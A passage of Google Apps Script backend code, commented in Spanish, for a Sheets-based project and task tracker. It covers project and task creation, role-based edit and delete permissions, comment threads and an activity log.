    ws = ss.insertSheet(SHEET_PROYECTOS);
    ws.appendRow(['ID','Nombre','País','Líder','Responsable','Deadline','Prioridad','Estado','Descripción','Notas','Creado','Semana','Participantes','TipoTrabajo','Riesgo','Documentos','ContrapartesConflicto']);
    ws.getRange(1,1,1,PROJ_COLS).setFontWeight('bold').setBackground('#FF4940').setFontColor('#FFFFFF');
    ws.setTabColor('#FF4940');
  }
  // Lock para evitar colisión de IDs entre addProject concurrentes
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    var lastRow = ws.getLastRow();
    // max(IDs existentes) + 1 — resiste borrados y mantiene IDs únicos.
    var newId = 1;
    if (lastRow >= 2) {
      var ids = ws.getRange(2, 1, lastRow - 1, 1).getValues();
      ids.forEach(function(r){ var v = parseInt(r[0], 10); if (!isNaN(v) && v >= newId) newId = v + 1; });
    }
    var equipos = readEquipos(ss);
    var pais  = obj.pais || getCountryForMember(obj.responsable, equipos);
    var lider = obj.lider || getLeaderForCountry(pais, equipos);
    // contrapartesConflicto puede llegar como array o como string CSV; serializamos a string.
    var cpc = obj.contrapartesConflicto || '';
    if (Array.isArray(cpc)) cpc = cpc.map(function(s){ return (s == null ? '' : s.toString()).trim(); }).filter(Boolean).join(', ');
    // Solo escribimos la col 17 si la hoja ya la tiene; appendRow trunca al ancho real.
    var lc = ws.getLastColumn();
    var rowVals = [
      newId, obj.nombre||'', pais, lider, obj.responsable||'',
      _deadlineToCell(obj.deadline), obj.priority||'Media', obj.status||'Activo',
      obj.descripcion||'', obj.notas||'', new Date(), getCurrentWeekLabel(), parts.join(', '),
      obj.tipoTrabajo||'', obj.riesgo||'', ''
    ];
    if (lc >= PROJ_CONTRAPARTES_COL) rowVals.push(cpc);
    ws.appendRow(_sanitizeRow(rowVals));
    return {success:true, id:newId, nombre:obj.nombre||''};
  } finally {
    lock.releaseLock();
    // invalidateCache() lo dispara _safeMutation en su finally; evita doble call.
  }
}

// Batch update de proyectos: aplica varios campos en una sola llamada.
// Valida permisos contra el estado actual antes de cualquier escritura.
function updateProjectFields(projId, fields) { return _safeMutation(function() { return _updateProjectFieldsImpl(projId, fields); }); }
function _updateProjectFieldsImpl(projId, fields) {
  if (!fields || typeof fields !== 'object') return { success: false, error: 'Invalid fields' };
  var ctx = _getAuthContext();
  var current = _readProjectById(ctx.ss, projId);
  if (!current) return { success: false, error: 'Project #' + projId + ' not found' };
  _authorizeProjectWrite(ctx, current);

  // Manager no puede mover el proyecto a otro país; specialist no puede
  // transferir responsabilidad ni cambiar país.
  if (ctx.role === 'manager' && fields.pais !== undefined && fields.pais !== ctx.user.code) {
    throw new Error('Sin permiso: no puedes mover el proyecto a otro país');
  }
  if (ctx.role === 'specialist') {
    if (fields.responsable !== undefined && fields.responsable !== ctx.user.name) {
      throw new Error('Sin permiso: no puedes transferir el proyecto');
    }
    if (fields.pais !== undefined && fields.pais !== current.pais) {
      throw new Error('Sin permiso: no puedes cambiar el país del proyecto');
    }
    // Participante (no responsable): solo contenido colaborativo. El gobierno
    // del proyecto (estado/cancelación, plazo, prioridad, nombre, lista de
    // participantes) queda para el responsable, su manager o head — antes
    // cualquier participante podía cancelar el proyecto o sacar al resto de
    // la lista de participantes (lockout, porque filterProjectsForRole deja
    // de mostrárselo a los removidos).
    if (_normalizeName(current.responsable) !== _normalizeName(ctx.user.name)) {
      var allowedForParticipant = { notas: 1, descripcion: 1 };
      var offending = Object.keys(fields).filter(function(k){ return !allowedForParticipant[k]; });
      if (offending.length) {
        throw new Error('Sin permiso: como participante podés editar notas y descripción. Estado, plazo y participantes los cambia el responsable o tu manager.');
      }
    }
  }

  var ws = ctx.ss.getSheetByName(SHEET_PROYECTOS);
  var fieldMap = {'nombre':2,'pais':3,'lider':4,'responsable':5,'deadline':6,'priority':7,'status':8,'descripcion':9,'notas':10,'participantes':13,'tipoTrabajo':14,'riesgo':15,'contrapartesConflicto':17};
  var row = current.row;

  // Lock para serializar mutaciones concurrentes en hoja Proyectos.
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    Object.keys(fields).forEach(function(k) {
      var col = fieldMap[k];
      if (!col) return;
      var v = fields[k];
      // deadline puede llegar como ISO 'yyyy-MM-dd'; lo guardamos como Date real
      // para que readProjects lo lea como fecha y el countdown funcione siempre.
      if (k === 'deadline') v = _deadlineToCell(v);
      // participantes puede llegar como array o string csv
      if (k === 'participantes' && Array.isArray(v)) v = v.join(', ');
      // contrapartesConflicto: array → csv; string → trust.
      if (k === 'contrapartesConflicto' && Array.isArray(v)) {
        v = v.map(function(s){ return (s == null ? '' : s.toString()).trim(); }).filter(Boolean).join(', ');
      }
      ws.getRange(row, col).setValue(_sanitizeCell(v));
    });
    return { success: true };
  } finally {
    lock.releaseLock();
    // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
  }
}

// Elimina un proyecto. Permiso (más estricto que editar: NO alcanza con ser
// participante): el responsable (creador del proyecto), el manager del país, o head.
// Seguridad: si el proyecto tiene tareas vinculadas (activas o en historial) NO se
// borra en duro — se pide reasignar o cancelar primero, para no dejar tareas
// huérfanas apuntando a un proyectoId inexistente.
function deleteProject(projId) { return _safeMutation(function() { return _deleteProjectImpl(projId); }); }
function _deleteProjectImpl(projId) {
  var ctx = _getAuthContext();
  var current = _readProjectById(ctx.ss, projId);
  if (!current) return _err('NOT_FOUND', 'Proyecto #' + projId + ' no encontrado');
  var canDelete = ctx.role === 'head'
    || (ctx.role === 'manager' && (!current.pais || current.pais === ctx.user.code))
    || (_normalizeName(current.responsable) === _normalizeName(ctx.user.name));
  if (!canDelete) return _err('PERM_DENIED', 'Solo el responsable, el manager del país o un head pueden eliminar el proyecto.');
  var n = _countTasksForProject(ctx.ss, projId);
  if (n > 0) {
    return _err('STATE_CONFLICT', 'El proyecto tiene ' + n + ' tarea' + (n === 1 ? '' : 's') + ' vinculada' + (n === 1 ? '' : 's') + '. Reasignalas o cancelá el proyecto (Editar → Estado: Cancelado) antes de eliminarlo.');
  }
  var ws = ctx.ss.getSheetByName(SHEET_PROYECTOS);
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch (e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    ws.deleteRow(current.row);
    return { success: true, id: projId };
  } finally {
    lock.releaseLock();
    // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
  }
}

// Cuenta tareas (activas + historial) vinculadas a un proyecto. Lectura barata:
// solo la col 12 (Proyecto/ID). Usada por _deleteProjectImpl como guard.
function _countTasksForProject(ss, projId) {
  var target = parseInt(projId, 10);
  if (isNaN(target)) return 0;
  var n = 0;
  [SHEET_ACTIVO, SHEET_HISTORIAL].forEach(function(name) {
    var ws = ss.getSheetByName(name); if (!ws) return;
    var lr = ws.getLastRow(); if (lr < 4) return;
    var col = ws.getRange(4, 12, lr - 3, 1).getValues(); // col 12 = Proyecto(ID)
    for (var i = 0; i < col.length; i++) {
      if (parseInt(col[i][0], 10) === target) n++;
    }
  });
  return n;
}

// ════════════════════════════════════════════════════════════════
// TASKS
// ════════════════════════════════════════════════════════════════
// Helper canónico para leer rows de data de Tracking Activo o Historial.
// Ambas hojas tienen headers en rows 1-3, así que data empieza en row 4.
// Antes algunos lugares (getTaskComments) leían desde row 2 → incluían
// headers como data. El bug estaba enmascarado porque String(headerText)
// nunca matchea contra String(taskId numérico), pero era frágil.
// Devuelve [] si no hay data, nunca null.
function _readHistorialDataRows(ws) {
  if (!ws) return [];
  var lastRow = ws.getLastRow();
  if (lastRow < 4) return [];
  return ws.getRange(4, 1, lastRow - 3, ws.getLastColumn()).getValues();
}

// Convierte un valor de celda a Date de forma segura. Devuelve null si el valor no
// es una fecha válida (p.ej. una celda de fecha editada a mano que quedó como texto
// "25/06/2026"). new Date(textoInvalido).toISOString() tira RangeError; sin este
// guard una sola celda mal tipeada en el Sheet voltea readTasks → getTrackerData →
// doGet para TODOS los usuarios.
function _safeDate(v) {
  if (v === null || v === undefined || v === '') return null;
  var d = (v instanceof Date) ? v : new Date(v);
  return (d instanceof Date && !isNaN(d.getTime())) ? d : null;
}

function readTasks(ws) {
  if (!ws) return [];
  var lastRow = ws.getLastRow(); if (lastRow < 4) return [];
  var lastCol = Math.min(ws.getLastColumn(), TASK_COLS);
  var data = ws.getRange(4, 1, lastRow - 3, lastCol).getValues();
  var tasks = [];
  data.forEach(function(row) {
    if (!row[1]) return;
    var proyVal = (row[11]||'').toString().trim();
    var _cre = _safeDate(row[8]);
    var _cer = _safeDate(row[9]);
    var _blk = (row[6] === 'Bloqueado') ? _safeDate(row[21]) : null;
    if (row[8] && !_cre) Logger.log('readTasks: fecha "Creado" invalida en tarea #' + row[0] + ' -> ignorada (valor: "' + row[8] + '")');
    if (row[9] && !_cer) Logger.log('readTasks: fecha "Cerrado" invalida en tarea #' + row[0] + ' -> ignorada (valor: "' + row[9] + '")');
    tasks.push({
      id:row[0], nombre:row[1]||'', resp:row[2]||'', acc:row[3]||'',
      deadline:row[4]?(row[4] instanceof Date?Utilities.formatDate(row[4],'America/Bogota','dd/MM/yyyy'):row[4].toString()):'',
      deadlineISO:row[4]?(row[4] instanceof Date?Utilities.formatDate(row[4],'America/Bogota','yyyy-MM-dd'):''):'', priority:row[5]||'Media', status:row[6]||'Pendiente',
      semana:row[7]||'',
      creado:_cre?Utilities.formatDate(_cre,'America/Bogota','dd/MM/yyyy'):'',
      creadoRaw:_cre?_cre.toISOString():null,
      cerrado:_cer?Utilities.formatDate(_cer,'America/Bogota','dd/MM/yyyy'):'',
      notas:row[10]||'',
      proyectoId: isNaN(parseInt(proyVal, 10)) ? '' : parseInt(proyVal, 10),
      proyecto: proyVal, // keep raw for backward compat
      pais:(row[12]||'').toString().trim(),
      lider:(row[13]||'').toString().trim(),
      tipoTrabajo:(row[14]||'').toString().trim(),
      riesgo:(row[15]||'').toString().trim(),
      documentos: _parseDocs(row[16]),
      confidencialidad: ((row[17] || 'estandar').toString().trim().toLowerCase()) || 'estandar',
      // Col 19 (índice 18): single text. Default '' si la columna aún no existe.
      contraparte: (row[18] || '').toString().trim(),
      // Col 20 (índice 19): área solicitante (cliente interno). Default '' si no existe.
      areaSolicitante: (row[19] || '').toString().trim(),
      // Col 21 (índice 20): Colaboradores (JSON [{name,role}]). Default [] si la
      // columna aún no existe en la hoja (deploy sin migrarColaboradores()).
      colaboradores: _parseColaboradores(row[20]),
      // Col 22 (índice 21): desde cuándo está bloqueada (Date). '' si la columna
      // no existe (sin migrarBlockedSince) o la tarea no está bloqueada.
      blockedSince: _blk ? _blk.toISOString() : ''
    });
  });
  tasks.sort(function(a,b){return (PRIO_ORDER[a.priority]||1)-(PRIO_ORDER[b.priority]||1)||(STATUS_ORDER[a.status]||2)-(STATUS_ORDER[b.status]||2)});
  return tasks;
}

function addTask(taskObj) {
  return _telemetry('addTask', function() {
    return _safeMutation(function() { return _addTaskImpl(taskObj); });
  }, { hasResp: !!(taskObj && taskObj.resp), hasProyecto: !!(taskObj && (taskObj.proyectoId || taskObj.proyecto)), closed: !!(taskObj && taskObj.closeOnCreate) });
}
function _addTaskImpl(taskObj) {
  var ctx = _getAuthContext();
  var equipos = ctx.equipos;
  var proposedResp = taskObj.resp || '';
  var proposedPais = taskObj.pais || getCountryForMember(proposedResp, equipos);
  // Validar permisos antes de escribir. Specialist solo puede asignarse a sí mismo;
  // manager solo dentro de su país; head sin restricción.
  _authorizeTaskWrite(ctx, { resp: proposedResp, pais: proposedPais });

  // Validar enums: si el cliente manda valores fuera del dominio (string arbitrario),
  // los normalizamos al default. Previene contaminar el sheet con valores raros que
  // luego confunden filtros y stats.
  var VALID_PRIO   = { 'Alta': 1, 'Media': 1, 'Baja': 1 };
  var VALID_STATUS = { 'Pendiente': 1, 'En curso': 1, 'En revisión': 1, 'Listo': 1, 'Bloqueado': 1, 'Cancelado': 1 };
  var VALID_CONF   = { 'estandar': 1, 'restringido': 1, 'confidencial': 1 };
  if (taskObj.priority && !VALID_PRIO[taskObj.priority]) taskObj.priority = 'Media';
  if (taskObj.status && !VALID_STATUS[taskObj.status]) taskObj.status = 'Pendiente';
  if (taskObj.confidencialidad && !VALID_CONF[taskObj.confidencialidad]) taskObj.confidencialidad = 'estandar';

  // Defensa en profundidad: el frontend tiene min=today en el input date, pero
  // un cliente bugueado o curl directo podría mandar fecha pasada. Rechazamos
  // server-side. Acepta hoy mismo (mismo día = deadline EOD).
  // Excepción: closeOnCreate ("ya realizada") puede traer un plazo pasado legítimo
  // (venció y ya se hizo); el guard solo aplica a tareas que nacen abiertas.
  if (taskObj.deadline && !taskObj.closeOnCreate) {
    var dlRaw = String(taskObj.deadline).trim();
    var m = dlRaw.match(/^(\d{4})-(\d{2})-(\d{2})/);
    if (m) {
      var dlDate = new Date(parseInt(m[1], 10), parseInt(m[2], 10) - 1, parseInt(m[3], 10));
      var todayBog = new Date(Utilities.formatDate(new Date(), 'America/Bogota', 'yyyy/MM/dd'));
      if (dlDate < todayBog) {
        return { success: false, error: 'El plazo no puede estar en el pasado.' };
      }
    }
  }

  var ss = ctx.ss, ws = ss.getSheetByName(SHEET_ACTIVO);
  // Lock para que nextTaskId + appendRow sean atómicos frente a creaciones concurrentes.
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  var created = null;
  try {
    var newId = nextTaskId(ss);
    var pais  = proposedPais;
    var lider = taskObj.lider || getLeaderForCountry(pais, equipos);
    // Normalizar proyectoId a entero; si no es válido, celda vacía.
    var pid = taskObj.proyectoId || taskObj.proyecto || '';
    var pidNum = parseInt(pid, 10);
    var pidCell = isNaN(pidNum) ? '' : pidNum;
    // Confidencialidad: specialist solo puede crear con 'estandar'. Manager/head
    // pueden elegir. Esto es consistente con updateTaskField que ya restringe los
    // cambios. Sin esta protección, un specialist con cliente bugueado podía crear
    // tareas confidenciales sin permiso.
    var conf = (taskObj.confidencialidad || 'estandar').toString().trim().toLowerCase() || 'estandar';
    if (ctx.role === 'specialist' && conf !== 'estandar') {
      conf = 'estandar';
    }
    // Auto-prefill de notas con checklist del template si:
    //  (a) hay tipoTrabajo con plantilla en la hoja 'Templates', y
    //  (b) el usuario no escribió notas (vacío o solo whitespace).
    // Lectura lazy: readTemplates reutiliza la cache de getTemplates si está caliente.
    var notas = (taskObj.notas || '').toString();
    if (taskObj.tipoTrabajo && !notas.replace(/\s+/g, '')) {
      try {
        var templates = readTemplates(ss);
        var checklist = templates[taskObj.tipoTrabajo];
        if (checklist && checklist.length) {
          notas = checklist.map(function(it){ return '- ' + it; }).join('\n');
        }
      } catch (e) { Logger.log('addTask: template prefill skipped: ' + ((e && e.message) || e)); }
    }
    var contraparte = (taskObj.contraparte || '').toString().trim();
    var areaSolicitante = (taskObj.areaSolicitante || '').toString().trim();
    // Construimos la fila al ancho real del sheet: si el usuario aún no agregó
    // la columna 17 (Documentos), 18 (Confidencialidad) o 19 (Contraparte), no las
    // escribimos (no podemos crear columnas desde acá). Si existen, se llenan default.
    var lc = ws.getLastColumn();
    var rowVals = [
      newId, taskObj.nombre||'', taskObj.resp||'', taskObj.acc||'',
      // ISO → Date real (mediodía local): si queda como string, readTasks puede
      // no derivar deadlineISO según el locale y la tarea nace sin ETA/SLA/digest.
      _deadlineToCell(taskObj.deadline||''), taskObj.priority||'Media', taskObj.status||'Pendiente',
      taskObj.semana||getCurrentWeekLabel(), new Date(), '', notas,
      pidCell, pais, lider,
      taskObj.tipoTrabajo||'', taskObj.riesgo||''
    ];
    // Solo agregamos columnas adicionales si la hoja las tiene; si no, appendRow las omite.
    if (lc >= 17) rowVals.push(''); // Documentos
    if (lc >= 18) rowVals.push(conf); // Confidencialidad
    if (lc >= TASK_CONTRAPARTE_COL) rowVals.push(contraparte); // Contraparte
    if (lc >= TASK_AREASOL_COL) rowVals.push(areaSolicitante); // Área solicitante
    var _colabs = [];
    if (lc >= TASK_COLAB_COL) {
      // Colaboradores (col 21): valida/normaliza y excluye al propio resp.
      _colabs = _parseColaboradores(JSON.stringify(taskObj.colaboradores || [])).filter(function(c){
        return _normalizeName(c.name) !== _normalizeName(taskObj.resp || '');
      });
      rowVals.push(_stringifyColaboradores(_colabs));
    }
    // BlockedSince (col 22): solo si nace bloqueada (raro pero posible vía API).
    if (lc >= TASK_BLOCKED_COL) rowVals.push(taskObj.status === 'Bloqueado' ? new Date() : '');
    ws.appendRow(_sanitizeRow(rowVals));
    _logActivity(ctx, newId, 'create', '', '', taskObj.nombre || '');
    // Avisos de creación: al responsable si NO es el creador ("te asignaron"),
    // y a cada colaborador inicial. canSeeName: ambos ya tienen acceso. Si nace
    // cerrada (closeOnCreate), no avisamos: notificar "te asignaron" una tarea ya
    // finalizada confunde.
    if (!taskObj.closeOnCreate) {
      if (taskObj.resp && _normalizeName(taskObj.resp) !== _normalizeName((ctx.user && ctx.user.name) || '')) {
        _notify(ctx, taskObj.resp, { kind: 'reassign', taskId: newId, taskName: taskObj.nombre, conf: conf, canSeeName: true });
      }
      _colabs.forEach(function(c){
        _notify(ctx, c.name, { kind: 'colaborador', role: c.role, taskId: newId, taskName: taskObj.nombre, conf: conf, canSeeName: true });
      });
    }
    created = { success: true, id: newId };
  } finally {
    lock.releaseLock();
    // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
  }
  // closeOnCreate ("ya estaba hecha"): cerrar de una vez. Reutiliza el flujo de
  // cierre estándar (_closeTaskByIdImpl: Listo + fecha de cierre + moveToHistorial
  // + log 'close'), llamado FUERA del lock de creación porque el script lock no es
  // reentrante. Si el cierre falla, la tarea queda creada y abierta (recuperable).
  if (taskObj.closeOnCreate && created && created.success) {
    try {
      var cres = _closeTaskByIdImpl(newId);
      created.closed = !!(cres && cres.success);
    } catch (e) {
      Logger.log('addTask closeOnCreate: no se pudo cerrar #' + newId + ': ' + ((e && e.message) || e));
      created.closeError = true;
    }
  }
  return created;
}

// ── COMMENTS THREAD ───────────────────────────────────────────
// Hilo de comentarios por tarea. Sheet 'Comments' se auto-crea en
// el primer uso. Columnas: id (auto-incremental), task_id (matches
// SHEET_ACTIVO/HISTORIAL), author_email, author_name, ts (ISO),
// body. Auth: cualquier usuario del allowlist puede leer/escribir
// comentarios de tareas que pueda ver (no agregamos un layer extra
// — el filtrado de tareas ya restringe quién ve qué).

function _commentsSheet(ss) {
  var ws = ss.getSheetByName(SHEET_COMMENTS);
  if (!ws) {
    ws = ss.insertSheet(SHEET_COMMENTS);
    ws.getRange(1, 1, 1, 8).setValues([['id', 'task_id', 'author_email', 'author_name', 'ts', 'body', 'edited_ts', 'deleted_ts']]);
    ws.getRange(1, 1, 1, 8).setFontWeight('bold');
    ws.setFrozenRows(1);
    return ws;
  }
  // Hoja existente puede tener solo 6 cols (versión vieja). Asegurar que las
  // columnas 7 (edited_ts) y 8 (deleted_ts) existan — necesarias para edit/delete.
  // Si faltan, agregar el header. Las filas viejas quedan con celdas vacías,
  // que el read trata como null (comentario nunca editado, nunca eliminado).
  var lc = ws.getLastColumn();
  if (lc < 7) ws.getRange(1, 7).setValue('edited_ts');
  if (lc < 8) ws.getRange(1, 8).setValue('deleted_ts');
  return ws;
}

function _nextCommentId(ws) {
  var lr = ws.getLastRow();
  if (lr < 2) return 1;
  var ids = ws.getRange(2, 1, lr - 1, 1).getValues();
  var max = 0;
  for (var i = 0; i < ids.length; i++) {
    var n = parseInt(ids[i][0], 10);
    if (!isNaN(n) && n > max) max = n;
  }
  return max + 1;
}

// Helper compartido: ¿el usuario actual puede ver esta tarea?
// Busca en activo + historial (con sus campos reales de conf/lider).
// Retorna true si el rol/permisos del user permiten ver; false sino.
// Usado por get/add/edit/delete comments para evitar leak/spoof entre países
// o niveles de confidencialidad.
function _canUserSeeTask(ctx, taskId) {
  var task = _readTaskById(ctx.ss, taskId);
  if (!task) {
    var hist = ctx.ss.getSheetByName(SHEET_HISTORIAL);
    var d2 = _readHistorialDataRows(hist);
    var lc2 = hist ? hist.getLastColumn() : 0;
    for (var j = 0; j < d2.length; j++) {
      if (String(d2[j][0]) === String(taskId)) {
        // Leer conf (col 18 / idx 17) y lider (col 14 / idx 13) reales.
        // Antes hardcodeaba conf='estandar' → leak de tasks cerradas
        // confidenciales en getTaskComments.
        var confRaw = lc2 >= 18 ? (d2[j][17] || 'estandar') : 'estandar';
        task = {
          id: d2[j][0],
          resp: d2[j][2],
          lider: lc2 >= 14 ? (d2[j][13] || '') : '',
          pais: d2[j][12],
          confidencialidad: String(confRaw).trim().toLowerCase() || 'estandar'
        };
        break;
      }
    }
  }
  if (!task) return false;
  var visible = (typeof filterTasksForRole === 'function')
    ? filterTasksForRole([task], ctx.role, ctx.user, ctx.equipos)
    : [task];
  return visible.length > 0;
}

// Espejo de _canUserSeeTask para proyectos: ¿el visitante podría ver este proyecto
// en la UI con su rol? Usado por los endpoints de IA para no filtrar insights de
// proyectos fuera del alcance del usuario.
function _canUserSeeProject(ctx, projId) {
  var proj = _readProjectById(ctx.ss, projId);
  if (!proj) return false;
  var visible = (typeof filterProjectsForRole === 'function')
    ? filterProjectsForRole([proj], ctx.role, ctx.user)
    : [proj];
  return visible.length > 0;
}

function getTaskComments(taskId) {
  return _telemetry('getTaskComments', function() {
    var ctx = _getAuthContext();
    // Validar visibilidad antes de leer comments. Si specialist/manager no
    // puede ver la tarea (otro país, conf restringida), tampoco los comments.
    if (!_canUserSeeTask(ctx, taskId)) return [];
    var task = _readTaskById(ctx.ss, taskId);
    if (!task) {
      // Puede estar en historial (cerrada). Buscar ahí.
      var hist = ctx.ss.getSheetByName(SHEET_HISTORIAL);
      var d2 = _readHistorialDataRows(hist);
      for (var j = 0; j < d2.length; j++) {
        if (String(d2[j][0]) === String(taskId)) {
          task = { id: d2[j][0], resp: d2[j][2], pais: d2[j][12], confidencialidad: 'estandar' };
          break;
        }
      }
    }
    if (!task) return [];
    // Aplicar el filtro de rol como hacemos en lectura general.
    var visible = (typeof filterTasksForRole === 'function')
      ? filterTasksForRole([task], ctx.role, ctx.user, ctx.equipos)
      : [task];
    if (!visible.length) return []; // no autorizado a ver esta tarea
    var ws = _commentsSheet(ctx.ss);
    var lr = ws.getLastRow();
    if (lr < 2) return [];
    var lc = Math.max(ws.getLastColumn(), 8);
    var data = ws.getRange(2, 1, lr - 1, lc).getValues();
    var out = [];
    var tid = String(taskId);
    function _toIso(v) {
      if (!v) return '';
      return v instanceof Date ? v.toISOString() : String(v);
    }
    for (var i = 0; i < data.length; i++) {
      var r = data[i];
      if (String(r[1]) !== tid) continue;
      out.push({
        id: r[0],
        task_id: r[1],
        author_email: r[2] || '',
        author_name: r[3] || '',
        ts: _toIso(r[4]),
        body: r[5] || '',
        edited_ts: _toIso(r[6]),
        deleted_ts: _toIso(r[7])
      });
    }
    // Sort by ts asc (oldest first → chronological thread)
    out.sort(function(a, b) { return (a.ts || '').localeCompare(b.ts || ''); });
    return out;
  }, { taskId: taskId });
}

// Edit y delete son solo para el autor del comentario. El backend valida
// identidad contra Session.getActiveUser() — no confía en el cliente.
// Edit: sobrescribe body + setea edited_ts. Delete: setea deleted_ts (soft
// delete; mantenemos la fila para preservar el hilo y la integridad del audit).
function editTaskComment(commentId, newBody) {
  return _telemetry('editTaskComment', function() {
    return _safeMutation(function() { return _editTaskCommentImpl(commentId, newBody); });
  }, { commentId: commentId });
}
function _editTaskCommentImpl(commentId, newBody) {
  var ctx = _getAuthContext();
  var trimmed = (newBody || '').toString().trim();
  if (!trimmed) return { success: false, error: 'Comment body required' };
  if (trimmed.length > 5000) return { success: false, error: 'Comment too long (max 5000 chars)' };
  var ws = _commentsSheet(ctx.ss);
  var lock = LockService.getScriptLock();
  try { lock.waitLock(8000); } catch (e) { throw new Error('Server busy, retry in a moment.'); }
  try {
    var lr = ws.getLastRow();
    if (lr < 2) return { success: false, error: 'Comment not found' };
    var lc = Math.max(ws.getLastColumn(), 8);
    var data = ws.getRange(2, 1, lr - 1, lc).getValues();
    var targetIdx = -1;
    for (var i = 0; i < data.length; i++) {
      if (String(data[i][0]) === String(commentId)) { targetIdx = i; break; }
    }
    if (targetIdx < 0) return { success: false, error: 'Comment not found' };
    var row = data[targetIdx];
    var rowAuthor = (row[2] || '').toString().toLowerCase().trim();
    var currentEmail = (ctx.email || '').toLowerCase().trim();
    if (!currentEmail || rowAuthor !== currentEmail) return { success: false, error: 'Solo el autor puede editar.' };
    // Doble check: el autor sigue teniendo visibilidad a la tarea. Si lo
    // reasignaron a otro país o confidencialidad subió, ya no puede editar
    // el comment desde la API.
    if (!_canUserSeeTask(ctx, row[1])) return { success: false, error: 'Ya no tenés acceso a esta tarea.' };
    if (row[7]) return { success: false, error: 'No se puede editar un comentario eliminado.' };
    var editedTs = new Date();
    var sheetRow = targetIdx + 2;
    ws.getRange(sheetRow, 6).setValue(_sanitizeRow([trimmed])[0]); // body
    ws.getRange(sheetRow, 7).setValue(editedTs);                    // edited_ts
    return {
      success: true,
      comment: {
        id: row[0],
        task_id: row[1],
        author_email: row[2] || '',
        author_name: row[3] || '',
        ts: row[4] ? (row[4] instanceof Date ? row[4].toISOString() : String(row[4])) : '',
        body: trimmed,
        edited_ts: editedTs.toISOString(),
        deleted_ts: ''
      }
    };
  } finally {
    lock.releaseLock();
  }
}

function deleteTaskComment(commentId) {
  return _telemetry('deleteTaskComment', function() {
    return _safeMutation(function() { return _deleteTaskCommentImpl(commentId); });
  }, { commentId: commentId });
}
function _deleteTaskCommentImpl(commentId) {
  var ctx = _getAuthContext();
  var ws = _commentsSheet(ctx.ss);
  var lock = LockService.getScriptLock();
  try { lock.waitLock(8000); } catch (e) { throw new Error('Server busy, retry in a moment.'); }
  try {
    var lr = ws.getLastRow();
    if (lr < 2) return { success: false, error: 'Comment not found' };
    var lc = Math.max(ws.getLastColumn(), 8);
    var data = ws.getRange(2, 1, lr - 1, lc).getValues();
    var targetIdx = -1;
    for (var i = 0; i < data.length; i++) {
      if (String(data[i][0]) === String(commentId)) { targetIdx = i; break; }
    }
    if (targetIdx < 0) return { success: false, error: 'Comment not found' };
    var row = data[targetIdx];
    var rowAuthor = (row[2] || '').toString().toLowerCase().trim();
    var currentEmail = (ctx.email || '').toLowerCase().trim();
    if (!currentEmail || rowAuthor !== currentEmail) return { success: false, error: 'Solo el autor puede eliminar.' };
    if (!_canUserSeeTask(ctx, row[1])) return { success: false, error: 'Ya no tenés acceso a esta tarea.' };
    if (row[7]) return { success: true, alreadyDeleted: true };
    var deletedTs = new Date();
    var sheetRow = targetIdx + 2;
    ws.getRange(sheetRow, 8).setValue(deletedTs);
    return { success: true, deleted_ts: deletedTs.toISOString() };
  } finally {
    lock.releaseLock();
  }
}

function addTaskComment(taskId, body) {
  return _telemetry('addTaskComment', function() {
    return _safeMutation(function() { return _addTaskCommentImpl(taskId, body); });
  }, { taskId: taskId });
}
// ── ACTIVITY LOG ────────────────────────────────────────────────
// Auditoría mínima de cambios sobre tareas. Lo usa el panel detalle
// como "Historial real" en lugar del sintético derivado de campos.
// Schema: id, ts, task_id, author_email, author_name, action, field,
// old_value, new_value. Auto-creado en primer uso. Las escrituras son
// best-effort (try/catch) — un fail en log NO debe abortar la mutation.
function _activitySheet(ss) {
  var ws = ss.getSheetByName(SHEET_ACTIVITY);
  if (!ws) {
    ws = ss.insertSheet(SHEET_ACTIVITY);
    ws.getRange(1, 1, 1, 9).setValues([[
      'id', 'ts', 'task_id', 'author_email', 'author_name',
      'action', 'field', 'old_value', 'new_value'
    ]]);
    ws.getRange(1, 1, 1, 9).setFontWeight('bold');
    ws.setFrozenRows(1);
  }
  return ws;
}
function _logActivity(ctx, taskId, action, field, oldValue, newValue) {
  if (!taskId) return;
  try {
    var ws = _activitySheet(ctx.ss);
    var lr = ws.getLastRow();
    var newId = lr < 2 ? 1 : lr; // monotónico best-effort, no es PK crítica
    var row = [
      newId,
      new Date(),
      taskId,
      ctx.email || '',
      (ctx.user && ctx.user.name) || '',
      action || 'update',
      field || '',
      oldValue == null ? '' : String(oldValue).substring(0, 500),
      newValue == null ? '' : String(newValue).substring(0, 500)
    ];
    ws.appendRow(_sanitizeRow(row));
  } catch (e) {
    Logger.log('_logActivity skipped: ' + ((e && e.message) || e));
  }
}
// Endpoint expuesto al frontend: devuelve activity log de una tarea
// (validando que el user pueda verla).
function getTaskActivity(taskId) {
  return _telemetry('getTaskActivity', function() {
    var ctx = _getAuthContext();
    if (!_canUserSeeTask(ctx, taskId)) return [];
    var ws = _activitySheet(ctx.ss);
    var lr = ws.getLastRow();
    if (lr < 2) return [];
    var data = ws.getRange(2, 1, lr - 1, 9).getValues();
    var out = [];
    var tid = String(taskId);
    function _toIso(v){ if(!v) return ''; return v instanceof Date ? v.toISOString() : String(v); }
    for (var i = 0; i < data.length; i++) {
      var r = data[i];
      if (String(r[2]) !== tid) continue;
      out.push({
        id: r[0], ts: _toIso(r[1]), task_id: r[2],
        author_email: r[3] || '', author_name: r[4] || '',
        action: r[5] || '', field: r[6] || '',
        old_value: r[7] || '', new_value: r[8] || ''
      });
    }
    out.sort(function(a, b){ return (b.ts || '').localeCompare(a.ts || ''); }); // más reciente primero
    return out;
  }, { taskId: taskId });
}

// Activity relevante PARA mí: eventos sobre mis tareas (resp === user.name)
// hechos por OTROS (excluir lo mío para no notificar al user de sus props
// acciones). Limit 30, ordenadas más recientes primero. Usado por el badge
// de notificaciones del avatar header.
function getMyRecentActivity(sinceIso) {
  return _telemetry('getMyRecentActivity', function() {
    var ctx = _getAuthContext();
    var myName = (ctx.user && ctx.user.name) || '';
    var myEmail = (ctx.email || '').toLowerCase();
